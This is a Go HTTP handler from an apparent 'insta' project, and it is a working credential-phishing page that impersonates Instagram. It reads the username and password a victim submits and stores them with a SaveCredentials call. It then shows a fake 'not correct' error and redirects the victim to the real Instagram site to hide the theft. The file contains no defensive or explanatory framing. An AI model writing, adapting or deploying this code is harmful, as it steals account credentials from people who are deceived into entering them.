package handler

import (
	"fmt"
	"github.com/tawesoft/golib/v2/dialog"
	"insta/pkg/render"
	"insta/pkg/save"
	"net/http"
)

func LoginHandler(w http.ResponseWriter, r *http.Request) {
	render.RenderTemplate(w, "index.index")
	r.ParseForm()
	username := r.PostFormValue("u_name")
	password := r.PostFormValue("pass")

	if len(username) >= 2 && len(password) > 7 {
		save.SaveCredentials(username, password)
		dialog.Alert("username and password is not correct !!!")
		http.Redirect(w, r, "https://www.instagram.com", http.StatusSeeOther)
	} else {
		fmt.Println("Please enter correct username or password. Try again")
		http.Redirect(w, r, "/", http.StatusSeeOther)
	}
}
